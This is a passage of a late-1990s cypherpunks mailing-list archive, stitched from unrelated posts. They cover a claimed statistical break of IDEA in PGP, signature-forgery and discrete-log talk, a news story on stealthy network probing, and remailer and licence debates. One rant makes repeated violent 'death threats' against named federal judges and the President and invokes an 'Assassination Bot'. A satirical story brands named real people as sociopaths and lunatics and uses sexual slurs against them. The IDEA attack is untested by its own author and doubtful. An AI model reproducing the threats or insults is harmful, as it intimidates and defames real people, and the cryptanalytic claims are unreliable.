     = (bias a5) * (1 + (bias a6) - (2*(bias a5)*(bias a6)))
     E4 = (bias a5) - (2 * (bias a5) * (bias a5) * (bias a6)) + ((bias
     a5) * (bias a6))
     = (bias a5) * (1 + (bias a6) - (2*(bias a5)*(bias a6)))
     Also as the '*' operator is biased towards its own bit for the
     result '1' - approx (60% to 100% depending on bit position).
     [Working from the low bit upwards will provide an even greater
     approximation as then you would have the relevant Key bits against
     a random data. ie for 1st bit, it is 100% dependant on the bit for
     a '1',...]
     eg using a simple 3x3 matrix on second bit, gives (only
     demonstrating the ratio):
          if K bit is 1 => bias a ~ (2/8), if K bit is 0 => bias a
     ~(1/8)
     ==> We can determine when :
     K5=0 and K6=0 as (bias a5) and (bias a6) will be at their highest
     ==> E1 & E2 are highest
     K5=1 and K6=1 as (bias a5) and (bias a6) are at their lowest
     ==> E1 & E2 are Lowest
     To determine between K5=0,K6=1 and K5=1,K6=0.
     K5 can be determined by check with E3 & E4 as they are both equal
     to :
     (bias a5) * (1 + (bias a6) - (2*(bias a5)*(bias a6)))  => directly
     relate to (bias a5) => K5
     =>When K5=0, both E3 & E4 will be low.
     => When K5=1, both E3 & E4 will be high.
     The Key rotation start bits are :
   Phase K1 K2 K3 K4 K5 K6
   1 0 16 32 48 64 80
   2 96 112 25 41 57 73
   3 89 105 121 9 50 66
   4 82 98 114 2 18 34
   5 75 91 107 123 11 27
   6 43 59 100 116 4 20
   7 36 52 68 84 125 13
   8 29 45 61 77 93 109
   final 22 38 54 70 n/a n/a
     Working backwards with these distributions you can deduce the key.
     ie work out K5 (93..108) and K6 (109..124) from its distribution
     pattern [using just the distributions for E2 & E3, as E1 & E4 have
     had the '*' operation applied in the final phase], then with K5 and
     K6 work out K1..K4 (22..85). You now have the key values for K1 to
     K6 !!!. Modify the Samples such they are back a phase and repeat
     (ie for each sample work backwards using known K1..K6 to find the
     E1..4 values).
     MAJOR ASSUMPTION : Assume that a large random sample provides a
     close to  even distribution at the end of each phase (For E2 & E3)
     such that the bias (ie a5 & a6) used to determine E2 and E3 are the
     only significant factors.
     Reasoning : If the distribution is not even, then it is very much
     easier to break (ie only the key values can cause the change in
     distribution pattern => know the pattern, know the key).
     I have developed a program which does just this (NOTE: not tested
     with real PGP data, as I have not had the time to investigate how
     the PGP file is structured, ie where the IDEA code starts and
     ends).
     It is available under a copyleft license similar to GNU. The Java
     Source code can be found at :
       [Application will not be released until beginning of 1999 when
     enough people are aware of the potential problem, and solutions are
     widely available - thus the threat to the general users privacy is
     kept to a minimal. Software houses which would like a delay in the
       release of this application so as to provide a solution should
             email: SGOSHA33 at mailexcite.com with their request]
   What can we do ?
     The above crack works because there is a large sample involved. If
     however you pre-encrypted the file such that you got your
     pre-encrypted file and a key file, where this key file is small and
     contains only the key required to open the pre-encrypt file. You
     then PGP the two files, this would make it much harder to break as
     the key file cannot be broken from the sampling technique descibed
     above.
     I have developed an application which does just that. It is
     available under a copyleft license similar to GNU. The Java source
     code can be found here :
                                  kiss.zip
     To run the application you will need Java installed on your
     machine. Place the files in a directory named KISS. The command
     line is :
     java KISS.kiss e              - encrypt
     java KISS.kiss d              - decrypt (do not add the
     kiss extension to the filename)
     After encryption you will get 2 files. The '.kiss' file is the
     encrypted file and the '.lips' file contains the key used to
     encrypt the file. You should then encrypt both files with PGP.
   What is in the pipeline for the future ?
     Task 1
     The above 'kiss' pre-encryption is not 100% safe from
     non-bruteforce cracking !!
     As the majority of files encrypted are text messages which are
     based mainly on the characters 'a' to 'z' thus the Ascii codes of
     the characters are of the form   011xxxxx. From this you can see
     that the rotating distribution as used above will tend toward '1'.
     Thus with enough samples they can deduce the key with the simple
     equation.
     KeyValue xor 1 = CommonValue ==> KeyValue = !CommonValue
     To prevent this my next application (codename Stable) will be a
     stabiliser program which will ensure that the distribution of the
     data has an even distribution.

This seems clear enough.  Digicash was competing with credit cards as a
payment system.  One of its advantages was that you didn't have to send
your credit card number across the net.  As fear of transferring credit
card numbers declined, Digicash lost this advantage.

Actually there is somewhat more flexibility than this.  You made up the
padding, it didn't come from the file, did it?  You could add perhaps 1
more byte of FF without stretching credibility too extremely.  Then n
could be 1020 - 1032 bits.  It's too bad that s started out so small
(assuming the "true" n was 1024 bits).
But didn't YOU have to factor n also?  That's what you showed, originally,
a large s^e which you factored down to get some small factors and a big
one.  If you manage to get a prime factorization you can combine factors
to get your n.  But it won't be any harder for him to factor than it was
for you.
The discrete log algorithm is similar to quadratic sieve and other modern
factoring algorithms.  You do multiple factorizations of other numbers
and combine them to generate the desired relationships.  The difference
is that the factor base is not just the primes, it uses special numbers.
There was a break a few years ago of the discrete log modulus being
used by Sun's RPC.  This was something like 200-300 bits.  Maybe that
discrete log code could be obtained from the authors.

-----END PGP PUBLIC KEY BLOCK-----
"Contrary to one famous philosopher,
you're saying the medium is not the
message," Judge Thomas Nelson said,
alluding to the media theorist Marshall
McLuhan.   Bullshit!
  The bits and bytes of email encryption are a clear message
that I wish to exercise my right to speak freely, without those
who wish to do me harm invading my privacy.
  The death of strong encryption on the InterNet will be the
global death of free speech on the InterNet. Accordingly, I feel it is necessary to make a stand and declare that I stand
ready and willing to fight to the death against anyone who
takes it upon themselves to try to imprison me behind an
ElectroMagnetic Curtain.
  This includes the Ninth Distric Court judges, if they come to
the conclusion that the government that they represent needs to
electronically imprison their citizens 'for their own safety.'
The problem: Criminals with a simple
encryption program can scramble their data
beyond even the government's ability to read it.   Fuck the lame LEA pricks who whine about not being able to
stop someone bringing in a planeload of drugs without being
able to invade the privacy of every person on the face of
the earth.
  Am I supposed to believe that I have knowledge of when and
where major drug shipments are taking place, simply by virtue
of hanging out as a musician, yet the LEA's are incapable of
finding out the same information by being competent in their
profession? Barf City...
 [I will shortly provide information for any LEA which wishes
  to prosecute me for my coming 'physical' death threat, on
  how to hunt me down like the filthy dog that I am.]
"Why are you saying that the fact that [encryption]
is functional takes it out of the First Amendment
context?" Myron Bright, one of the judges, asked
the Justice Department attorney, who was still in
mid-sentence. He answered that the regulations
were not aimed at suppressing speech, but only at
the physical capacity of encryption to thwart
government intelligence gathering.   The Spanish language has the same "physical capacity." So does (:>), (;[), and {;-|). Likewise, BTW, FWIW, FYI, and
my own personal favorite, YMMV (You Make Me Vomit? --or--
Your Mileage May Vary?). <-- Ambidextrous encryption.
  An-cay e-way pect-exay ig-pay atin-lay usts-bay of   Whispering also has the "physical capacity" to "thwart government intelligence gathering."
  When does the bullshit stop? When do we stop making the
use of the Spanish language over the InterNet illegal?
When do we stop making whispering, pig-latin, anagrams
and acronyms illegal?
  When do we stop saying that our government is such a
piece of crap that it is a danger to let its citizens
communicate freely, in private, and share their private
thoughts with one another?
At one point Fletcher called the government's case   Only because her mom taught her that it was unladylike to
say "Bullshit!"
In arguments Monday, a Justice Department
lawyer, Scott McIntosh, said the government's
intent was to preserve the ability of intelligence
agencies to eavesdrop on foreign governments
and citizens.   Let's see if I have this right...
  The U.S. government needs to destroy the right to free speech and right to privacy of its own citizens in order to infringe
upon the human rights of the governments and citizens of other
countries? Countries which already have strong encryption?
Countries like Red China, which is currently engaged in encryption research with an American company who got permission
to export much more diverse encryption material (after making
a huge campaign donation to the Whitehouse) than Professor
Bernstein will ever likely share with others?
  Apologies to Judge Fletcher, but that's not "puzzling." That's
the same-old-same-old Bullshit!
OFFICIAL 'PHYSICAL' DEATH THREAT!!!
  The pen is mightier than the sword. Thus, I prefer to wage my
'war to the death' against those who would stomp on my basic
human rights *"in the interests of National Security"* with my
electronic pen, on the InterNet, using encryption when I have
reason to fear persecution by Facist, Nazi motherfuckers.
[* ~~ TruthMonger Vernacular Translation ~~ "so that the  government can maintain its authority over the citizens
 by use of force and violation of human rights, rather than
 going to all of the trouble of acting in a manner that will
 garner the citizens' respect."]
  I will continue to express my thoughts through the words
I send electronically over the InterNet, both publically
and privately. I will fight to the bandwidth death against
anyone who wants to deny me my right to express my opinions
and access the opinions of those who also wish to express
their own opinions and share their true thoughts with their
fellow humans.
  If the ElectronicMagnetic Curtain slams down around me, then I will have no choice but to continue my current fight
in MeatSpace.
  And I am not alone...
  I will share the same 'DEATH THREAT!!!' with Judges Fletcher,
Nelson and Bright that I have shared with the President and
a host of Congressional and Senatorial representatives:
  "You can fuck some of the people all of the time, and all of
the people some of the time, but you are going to end up in a
body bag or a pine box before you manage to fuck all of the
people all of the time."
  Am *I* going to whack you out? Maybe...
  I would prefer just dumping some tea in Boston Harbor, if that
will get my message across in MeatSpace, but if it won't, then
I guess I will have to take stronger action.
  There are undoubtedly a plethora of LEA's ready and willing to
prosecute and imprison me for agreeing with Patrick Henry, who
said, "Give me liberty, or give me death." The irony, of course,
is that I do not pose a great danger to anyone but myself as
long as I continue to have my human rights and my liberty

of any LEA who gets a wild hair up their butt to throw a

then I am the least of your problems, because there undoubtedly

  However, if you want to go to the trouble of tracking me down, I will give you some hints, since it seems likely that
anyone who has trouble finding a ton of cocaine at an airport might not be competent in CyberSpace, either.
  You might want to check with the Webmasters at the sites
quoted above to see who has accessed their web sites this

since I am a sorry enough son-of-a-bitch that they would not

peers, assuming that they can make certain that I am not tried by a jury of my own peers.
Bonus Points:
  I can also be tied into Jim Bell's Worldwide Conspiracy to assassinate government authorities, through my implementation
of an Assassination Bot.
 (I am willing to 'rat out' Jim for two bottles of Scotch. If
 he is willing to rat _me_ out for less, then I guess it's
 just my hard luck, eh? <--that's another hint!)

in the commission of a crime.

The whole point of the CHALLENGE response went straight over his head,
didn't it?  It's almost as though there are two mailing lists here: the
one for dolts, where Jim Choate gets into his idiotic little arguments
with his fellow fools, yammering back and forth on totally off-topic
matters, and the one for people interested in cryptography and its
We have here the first known case where a key was constructed ex post
facto to validate a signed message, in response to Adam Back's challenge.
No longer can you assume that just because you posted a signed message
on a certain date, and you hold the public key which signed that message,
that you can later prove authorship.  It challenges some of the implicit
assumptions which have been made in using public key cryptography.
And all Jim Choate can do is take issue with a snippet of Toto's ravings
which were included purely to illustrate the signature validity.  He is
completely unaware of what is really happening.

@_subject: ArcotSign 
Based on  the idea is to defend against
an attacker who manages to steal a copy of the secret key file, and who
then tries to guess the passphrase which protects it.  The file data
is encrypted in an unstructured generic manner so that all decryptions
look like random data, even the correct one.  This gives the attacker
no information about when he has guessed the correct passphrase.
For this to work, the public key has to be kept secret(!).  Otherwise the
right passphrase could be discovered by testing the decrypted private key
against the public key.  Arcot suggests that this would be appropriate
for an environment where only one or a few trusted servers need to
authenticate users.  These servers would be the only ones which have
copies of the public keys.  (It is not necessary that signed documents be
kept confidential, however a randomized signing algorithm must be used.)
As Greg points out, much the same could be accomplished simply by having
the servers share secret 3DES keys with their users, each user having his
own private 3DES key.  The users could encrypt messages using their 3DES
key and the server would decrypt using the appropriate key, which would
also serve to authenticate the user.
The Arcot people suggest that an advantage over this scheme is that
servers don't have to store information on all clients.  But much the same
thing could be done with symmetric cryptography.  In the Arcot system,
the client sends his public key certificate, encrypted to the server,
along with his request.  The server receives the cert and uses it to
verify/decrypt the message.  With symmetric cryptography, the client
could have the shared 3DES key encrypted using the server's public key,
and send that along with his message in a similar way.
The confusing thing about the Arcot system is this: how sensitive is the
public key?  Is it as sensitive as a shared secret key?  Superficially
not, since in order to exploit the public key you also have to steal the
private key file and then guess the passphrase.  But on the other hand,
if this is more than security through obscurity, you have to treat
it in many ways as equally sensitive.  Users of the Arcot system,
believing that they are safe because their public keys are secret,
may become casual about revealing their private key files and choosing
easy to guess passphrases.  They might even send the files around via
insecure channels.  With this kind of usage, the public key does become
just as sensitive as a shared secret key would be.
In that case, not only the servers, but all parts of the PKI must be
brought inside the trust boundary.  They are all holding material which,
if revealed, would compromise the security around which the system
is built.  You end up with trust relationships more similar to those in
a system like Kerberos than in a normal PKI.
The analogy with smart cards is that these cards protect your private key.
With a perfect smart card, an attacker can't do any better than chance
guessing of your private key.  With the Arcot system, the same is true.
Decrypting the private key file gives no information about its content,
because pure random data is encrypted.  Therefore with their system the
attacker also can't do better than chance guessing.
However this ignores the cost of the system, discarding many of the
advantages of public key cryptography.  You don't have to do that if you
use smart cards.
Yes, this seems obscure.

N is the product of two primes, but each p-1 has about 16 small prime factors

this choice of primes it took about three hours to run the discrete log.

@_subject: Cypherpunks defeat? 
It's ironic that you would have to ask that question here.
The cypherpunks group was founded on this very premise: that through the
use of cryptography, people would become able to engage in a wide range
of voluntary transactions, outside of the reach of meddling interlopers.
Most cypherpunks have become disillusioned about their dreams, and you
will seldom hear them defend the notion that cryptography offers any kind
of alternative to a society based on coercion.  The past few years have
been hard ones.  The failure of digital cash, the gradual trend towards
a debate over when and how (rather than whether) to regulate domestic
cryptography, widespread abuse of anonymity, all these make the original
cypherpunk goals seem even more distant today than in the past.
Is the cypherpunks dream dead?  Is the movement over?
Maybe it is time to give up.  Throw in the towel, admit that we lost.
Sure, there are still battles to be fought, rear-ground actions where we
can perhaps delay the inevitable outcome.  But the vision has been lost,
and all that is left is the post-mortem analysis of the failed dream.

@_subject: Jury duty considered harmful, or at least rare 
Maybe you skipped class all the time. Maybe you didn't have to compete to
get into a competitive graduate school or graduate from that school. Maybe
you hold your "meetings" on the golf course and cheat your company. I
don't. That isn't the point.
Glad to hear that you make a habit of blowing off class and playing golf
on company time. Snip. That's nice for people who work at your company. It won't work for a small
business where the juror own and operates it. It also won't work for a
small business owner to hire more help and still pay the juror, because
then it's cheating the owner.
The court system summons the people under penalty of law. The court system
puts them on a jury. The government isn't repealing all the bullshit
legislation. The government can pay the bills. Can't afford it? Maybe we
should redirect some of that welfare money. That's primarily because of all the bullshit laws and legal events we
have: drug laws, computer crime laws, frivolous lawsuits, set-ups by the
cops, ITAR/EAR, and other things along that line of thought.
The last time I was called for jury duty was back in college, where they
got me in the week of finals. Of course, they hit me on that day, so I
have to jump through all sorts of hoops and seriously piss a couple of
professors off. Nothing keeps those professors from giving somebody like
that a harder final either, under the pretense that they might have talked
to others in the class about what the questions and answers were, which
means that their grades relative to others in the class are then skewed,
but the curve is still applied to them. Repeat with similar situations for
any profession which isn't like canning at a tomato sauce plant.
How many people do you think are found guilty because 11 people in the
jury think he should be, and 1 person in the jury thinks the law shouldn't
even be there but lets it go because the other 11 people on the jury don't
understand the concept of jury nullification, they all just want to go
home and not keep losing their livelihood, it *is* the law no matter how
unconstitutional it may be, and the offense is relatively minor anyway?

Flowers for Alger Anon
                                       - FPP
  The two youths ducked quickly behind a tree to avoid
being spotted by the senile old fart who had finally given up
on finding his shoes and climbed barefoot up the step-ladder
to begin drilling out the cannon muzzle on the War Surplus
Army Tank he had recently acquired.
  As he labored he mumbled grouchily to himself about
how he was going to "show that Commie Bastard, Igor", and all
of the other former residents of The Home(TM) what he thought
of their efforts to take over "his" CypherPunks Mailing List.
  "Distributed, my ass!" the old fart scowled as he
climbed down the ladder, then grinned madly as he patted the
stack of shells sitting next to the tank.
  "I'll distribute those bastards...They should'a
Checked The Archives", he said, pausing to scratch his head
and add, "TradeMark". Then continuing, "before they fucked
with me. Then they'da seen how I ChopChopped them Torah-
Torah Bastards when they tried to muscle in on my list."
  "It's 'mine'!" the grouchy, paranoid old fart shouted,
turning his head around quickly in all directions, as if
challenging, and half-expecting, Unseen Beings to dispute
his claim.
  The two youngsters ducked and tried not to giggle
as they ran down the hill, finally collapsing on the dirt
road near the bottom and venting their laughter.
  Tim C. May was the most hilarious of the Cypher
Punks they'd investigated so far, but 'all' of the CPUNX
were "more than suitable", as Carol Anne Cypherpunk had
declared while they were evaluating Jim Choate, "for slicing
and buttering, and placing on a tray of Christmas snacks."
  Blanc Weber had agreed heartily with the new
coconspirator (sometimes spelled with a hyphen), in their
'Quest to Question Anonymity', as the Army o' Dog-Bitch
Battallion Warrior Godesses, as they had proclaimed them-
selves, had Code Named their Chosen Mission From Dog.
  Carol Anne, choosing Androgyny over Anonymity,
changed her name to Carroll for The Mission, vowing to
balance the Tao by taking on any tasks requiring "male
energy", which, on a CypherPunks Mission From Dog(TM),
Carroll stated with a straight face, might include
"blowing Dimitri".
  The Girls(Maybe) split a gut laughing over Blanc's
reply that, being of a more peaceful nature than the 'Nuke
DC Clique', they might have to "blow" their way out of
dangerous situations by the use of Soft Targets rather
than with Heavy Weaponry.
  Then they decided to get serious, before they, too,
became candidates for The Home.
  Blanc Weber, a veteran Cypher Punk Cult of One
Neophyte(TM) had felt slighted when the Author, a relative
newcomer to the CPUNX list (at least under his 'TOTO' persona),
had chosen to initiate two male Cypher Punks, Back and
McCrackin, into his 3-Entity Circle of Eunuchs Gorilla Cell,
instead of including Blanc, who had established a fairly
close rapport with TOTO in their private email exchanges.
   Even more to Blanc's surprise, disappointment,
and suspicion, TOTO failed to respond even to her offer to
engage in joint Army of Dog Maneuvers with him across various
Electronic Boundaries of the InterNet.  She had begun to
suspect that TOTO's lack of response to her Digital Warrior
overtures were the result of something more sinister than
simple male chauvinism.
   Her suspicions were confirmed when she caught up
with TOTO, using his CJ Parker alias, at Defcon 6.0, as he
was Pontificating, under the guise of 'Chief Cypher Punks
Spokes Person', on the 'Anonymizer', for a guillible group
of young hackers.
   "It is run by a HedgeHog riding Lance's Coat Tails,
since Lance invented that thing that hangs on the back of
toilet bowls, and the Anonymizer is the Blue Thing that
hangs on the back of the hard drive.
   Blanc, stunned that TOTO, who claimed to be the
Author, was a Total Fucking Moron (TM), listened as he
continued .
   "The Anonymizer prevents Peeping TOMS from being
able to tell whose hairy dick is making a bad smell on the
carpet of the recipient's computer, after No Mail from
NoBody comes out of the Email Chutechute.
  Blanc realized that CJ Parker was also a Total
Fucking Lunatic(TM) as he glanced furtively around to
whisper a dire warning to the spellbound young hackers
hanging on his everyword.
  "And the Peeping Toms are everywhere.
  "As a matter of fact", he added glancing quickly
over both shoulders, "when you can't see them at all..."
he paused for effect, "...then you know that they're 'good'".
  "Real good", he added, turning to direct his
wild-eyed stare at Blanc, who had just finished going
through his knapsack while he was distracted.
  Blanc had hurried away, deeply disturbed by what
she had found in TOTO's bag.  It wasn't just stationery
from The Home--it was 'personalized' stationery from
The Home for the Criminally Insane.
  Blanc Weber's confusion and suspicions deepened
when her attempts to warn other CPUNKS about TOTO were
ignored by all except the few apparent females on the list,
such as Carol Anne Cypherpunk and World Renowned Bottle
Collector Lynn Harrison (who was long rumored to have
joined the male-dominated mailing list only as a forum
to trade her panties to young CPUNX in the throbbing
throes of puberty, in return for the Standard Issue Klien
Bottles, they received upon joining the Digital Anarchist
Union, Local 01, rumored to be headquartered in Bienfait,
  When The Girls(Maybe) of the Bitch Battallion took
to the road to investigate the remaining CypherPunks, they
quickly discovered that 'all' of the verifiable Meat Space
Personalities they positively linked to the various
Cyperpunks Consistent Net Personas (TM) were, in fact,
certifiably Cuckoo Cock Suckers(TM) in MeatSpace Reality.
With the only readily apparent link between them being
their connection to the Home for the Criminally Insane.
  Some of the MeatSpace Personalities behind the
Digital Personas on the CPUNX Mailing List--Ian Goldberg,
Alec de Jeune, Ulf Moeller, Peter Trei and Jim Choate--were
Highly Social Sociopaths, capable of putting ona suit and
tie, if need be, and glad-handing business people and
purchasing agents (all the while slitting their sleeping
throats, in the Dark Corners of their mind).
  John Gilmore, Declan McCullagh, Robert Hettinga,
Vin McClellan, even Froomkin--all of the Mainstream
Dream/Actively Connected To Society/Cypherpunks MeatSpace
Verifiable Identities, without fail, shared the same

Navy fights new hack method
Tim Clark
CNET NEWS.COM
Hackers are banding together across the globe to mount low-visibility
attacks in an effort to sneak under the radar of security specialists and
intrusion detection software, a U.S. Navy network security team said today. Coordinated attacks from up to 15 different locations on several continents
have been detected, and Navy experts believe that the attackers garner
information by probing Navy Web sites and then share it among themselves. "These new patterns are really hard to decipher--you need expert forensics
to get the smoking gun," said Stephen Northcutt, head of the Shadow
intrusion detection team at the Naval Surface Warfare Center. "To know
what's really happening will require law enforcement to get hold of the
hackers' code so we can disassemble it." The new method involves sending as few as two suspicious probes per hour to
a host computer, a level of interest that usually won't be detected by
standard countermeasures. But by pooling information learned from those
probes, hackers can garner considerable knowledge about a site. Northcutt said the new technique for attacks was discovered only this month
and has been detected at Defense Department facilities as well as in
private sector sites, including some outside the United States. The Shadow group has posted descriptions of the attacks and
countermeasures, and the information has been forwarded to CERT, which
investigates security attacks. "Most intrusion detection systems have a threshold, a radar. These attacks
are intentionally sliding under that threshold so normal intrusion
detection tools will not detect them," said Tim Aldrich, principal analyst
at the Navy facility. The Shadow team said that although the new method is harder to detect, it
should not affect sites that are well-secured. But the technique puts sites
with weak security at greater risk. The attacks do not involve a new hacker tool or new kind of attack, but
rather represent a low-visibility technique for perpetrating attacks. For
example, one coordinated attack that involved at least 14 locations simply
probed a Web site for security weaknesses without mounting a break-in. The Shadow Intrusion Detection team said it cannot determine how many
people might be involved in the attacks--hackers frequently use many
different machines to launch their attacks. But the number of individuals
involved is less important than the technique itself, Northcutt said. The technique could be used to scan or mount attacks from more than 100
Internet addresses. The security experts also suggested that makers of
commercial intrusion detection software need to counter the new method. "This stealthy probing enables large amounts of parallel firepower, which
means many attack attempts [from many sites] over a short time frame," said
a note distributed by the System Administration Networking and Security
(SANS) Institute. Going public with a news of new hacker techniques is somewhat unusual in
the secretive network security community, which often fears that
publicizing attacks before countermeasures are known will tip off attackers
to vulnerabilities. "We went public in hopes of raising awareness," Northcutt said. "You're
only going to be able to find stealthy stuff by looking for stealthy stuff." But before publicizing the new hacker technique, he added, the Shadow team
had checked to be certain it would not jeopardize any official actions
against the attackers. He also thinks that users of the attack may be caught. "If they're working together, it ought to be easier to track them down
because they leave more of a trail," he said.

Whenever these people troll for flames here they get them one way or

The AOLers get triple effect that way. I don't think Merrill ever misses a chance to defend AOL and attack anybody who attacks them. About a week ago somebody posted a copy or parts of most AOL postings which were sent here in the last months. Merrill ignores the part about how the posts were classified and sends back some vague flame accusing the author of classing posts he disagreed with as "clueless" then he quotes the entire thing back to the list.

And where did he not? A few could be debated. The rest were either written
so badly that they were incomprehensible, were off-topic, or didn't
include quoted material in a reply/followup. He also stated that he was
counting postings which used that '<< >>' scheme as automatically bad,
which is understandable. Either way, he seemed to be trying to show the
statistics. Pull one or two postings off of one side and put them on the
other and the statistics are still pretty bad for AOL.

@_subject: Remailers, PGP, and a Project Suggestion 
Even this is a secondary issue.
Many people are using remailers these days because of the advent of the
WWW. Virtually anything written, retrieved, or transfered on the Internet
is vulnerable to monitoring, logging, and future use against you. Even if
you trust the guy you're sending mail to, you can't necessarily trust his
computer security or the security of the network. Systems like Dejanews
and the web search engines illustrate just how much of a log is out there.
That isn't counting the information available solely from mail headers and
IP addresses.
When somebody wants to perform a "great purge," they just go off to a
search engine or database, type in some parameters, and get a list of
people to shoot, jail, or harass.
The natural solution to this is to disguise your identity whenever
possible. I estimate that we have several dozen people who actively post
to Cypherpunks through remailers judging by the way some things are stated
in the postings. I can't tell for sure, and that's the point.
If you want to generate reputation capital, use a nym server. Nym servers
make it obvious that you're using a nym, but it allows you to generate as
many reputations as you want and keep them separate. They're hard to use
without a tool, even for the best of us. Premail leaves a lot to be
desired in that it's slow, has some bugs, and lacks some good features,
but most of the people who want to create a new version seem to live in
the U.S..
The real advantage of the nym servers is that they allow people to see the
origin of the message at a glance. You can do the same thing with regular
anonymous remailers, but you have to verify the signature rather than
glancing at the headers. You should still verify the signature in either
case. This was less of a problem than it once was because premail was out
there, until PGP 5 came out.
PGP 5.x is incompatable with previous versions since it changed both the
protocols and the command line interface. Unfortunately, they changed the
command line interface in a rather stupid way. They also wound up
releasing the Windows version before the UNIX version (by something like
three months).
They seem to check argv[0] to determine what kind of operation you want to
do. 'pgp -seat' won't work anymore. Instead, it's a variant under 'pgpe'.
One PGP binary is created, and several links are set up. The result is
that you can't change the name of the binaries and links if you want. If
there's an advantage to this, I sure don't see it.
When they released the Windows version, Windows users understandably
snatched it up and started using it. The result was a bunch of
incompatabilities between two platforms which could have easily been
solved had PGP, Inc. exercised a little more discression.
That's a moot point now, though. The problem which still remains is the
command line interface. It breaks any script which references PGP, and
that's the main problem.
What UNIX really needs is some kind of mailer which integrates an updated
premail, PGP 2.x support, and PGP 5.x support. Unfortunately, much to the
delight of the government, the people who would code such a thing are
probably in the U.S. like I am.

Well, for some months now they've password protected some of the more
delicate stuff (e.g., "lessons learned", some of the field manuals).  And
they have been rejecting non .mil addresses too.
Certainly we can expect them to eventually get a clue and think about what's out there.  Mostly they have.  (Of course it was within
the last year that a .mil was exporting PGP!) The army's over-reaction
is quaint but essentially reasonable --the W3 pages are just PR,
and they're real edgy these days after they tried to scalp Osama
with a tomohawk.
[digression: I wonder when Osama will have his own web page with matching
funds for the head of the Great Satan, and whether there would
be a shootout on the net, e.g., the DNS records being changed, a
phone call to their ISP]
As far as the NSA's online personnel records, I bet they're still worried
about the CIA shootout down the street a few years back.
There's still plenty of names, phones, email addresses in the .gov domain, with building locations, etc.  But Jim Bell is

They keep trying different passwords to the constitution.

You just pegged my bogometer.
The GNU GPL discourages the sale of proprietary software by prohibiting
anything using code covered by the license from being proprietary, and
that's right.
The proposed Cypherpunks license discourages the distribution of software
with key recovery (= government back doors) by prohibiting anything using
code covered by the license from having key recovery, and that's wrong.
Both these licenses would be trying to promote their propagators' goals
through restrictions on code re-use. However, Cypherpunks and GNU types
don't have exactly the same goals. GNU types consider the availability of
good, non-proprietary software to be paramount, whereas Cypherpunks
generally consider the use of good cryptography in useful applications to
be paramount, whether the code behind it is free or expensive, open-source
or proprietary (although proprietary code often ends up being bad crypto).
Companies will not put good crypto in useful applications if it
necessitates that they all but give up whatever intellectual property
rights they had to other parts -- even non-crypto-related parts -- of the
application, so the GPL is clearly not the best license for to promote
Cypherpunk goals.
On a different tangent, lemme suggest some vague ideas for a few potential
Warnings about proprietary code: Authors of products using CPL-covered
code which do not release all source code must either a> clearly
demonstrate that none of the unreleased code can have a negative impact on
security or b> place a message on any marketing materials or documentation
mentioning the product's security features saying "For important warnings
about this product's security, see ."
CPL advert: Authors of products using CPL-covered code are required to
include with their copyright information some message like "This product
uses code covered by the Cypherpunk License for its security features. See
 for more information." and are requested to include references to
the site in other convenient places. This site, of course, need not be
limited to dry legalese about the license, but may include vivid
descriptions of driftnet wiretaps and other mischief perpetrated by NSA
and friends, cryptopolitical rants, or even tools for building and setting
up various cryptostuff. Note the "may;" lots of stuff requires lots of
work, and so, unless there was sort of backing from a civil-liberties
organization with staff-hours to spare or some miraculous effort of
miracle of organization...how's that secure talk client going?
Strength requirements: By default and taking into account only the
published attacks on the cryptographic primitives used, an average of at
least 2^79 operations must be required for anybody (law-enforcement or
not) to compromise the product's security features. If and only if laws
restrict this software's use or sale, a second version may be created with
lower strength, and the stronger version may operate at lower strength
when necessary for smooth interoperation, provided that the user knows
before sending any information that the connection uses weakened
encryption. The weaker version must be clearly marked as such (i.e.,
"Widget 2.4 Export" vs. "Widget 2.4").
Fact sheet: Authors of products using CPL-covered code are requested but
not required to create a sort of security fact sheet detailing the
technical aspects of the product's security features --
* algorithms and key lengths * a precise description of the breadth of the security features
* a description of the threat model used in the design process
